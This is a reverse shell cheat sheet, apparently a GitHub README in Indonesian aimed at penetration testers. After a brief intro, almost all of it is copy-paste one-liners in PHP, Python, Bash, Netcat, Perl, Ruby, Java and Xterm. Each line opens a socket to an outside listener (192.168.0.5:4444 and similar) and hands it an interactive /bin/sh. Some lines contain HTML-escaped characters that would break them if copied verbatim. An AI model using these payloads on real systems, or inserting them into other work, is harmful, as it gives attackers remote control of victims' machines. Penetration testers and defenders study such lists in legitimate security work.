<p align="left"><a href="https://www.itsecurity.id/"><img height="150" title="Xcod3bughunt3r" src="0011.png"/></a></p>

# ***Xcod3 - Shell Scripts***
##### ``Koleksi skrip shell yang saya buat.``
### ***Reverse Shell Cheat Sheet***
##### ``Jika Anda cukup beruntung untuk menemukan kerentanan eksekusi perintah selama tes penetrasi, segera setelah itu Anda mungkin akan menginginkan cangkang interaktif. Jika tidak mungkin untuk menambahkan akunbaru/file ssh/.rhosts dan cukup masuk, langkah Anda selanjutnya cenderung mengongkong kembali shell terbalik atau mengikat cangkang ke port TCP. Halaman ini berurusan dengan yang pertama. Pilihan Anda untuk membuat shell terbalik dibatasi oleh bahasa skrip yang diinstal pada sistem target - meskipun Anda mungkin dapat mengunggah program biner juga jika Anda dipersiapkan dengan baik. Contoh yang ditampilkan disesuaikan dengan sistem seperti unix. Beberapa contoh di bawah ini juga harus berfungsi pada Windows jika Anda menggunakan pengganti "/bin/sh -i" dengan "cmd.exe". Setiap metode di bawah ini bertujuan untuk menjadi satu liner yang dapat Anda salin/tempel. Karena itu adalah garis yang cukup pendek, tetapi tidak terlalu mudah dibaca.``

#### ***Php :***
```
php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
```

#### ***Python :***
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### ***Bash :***
```
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
```

#### ***Netcat :***
```
nc -e /bin/sh 192.168.0.5 4444
```

#### ***Perl :***
```
perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
```

#### ***Ruby :***
```
ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
```

#### ***Java :***
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/192.168.0.5/4444;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()
```

#### ***Xterm :***
```
xterm -display 192.168.0.5:4444
```

#### ``DEVELOPERS:``*[Xcod3bughunt3r](https://github.com/Xcod3bughunt3r/Xcod3bughunt3r)*.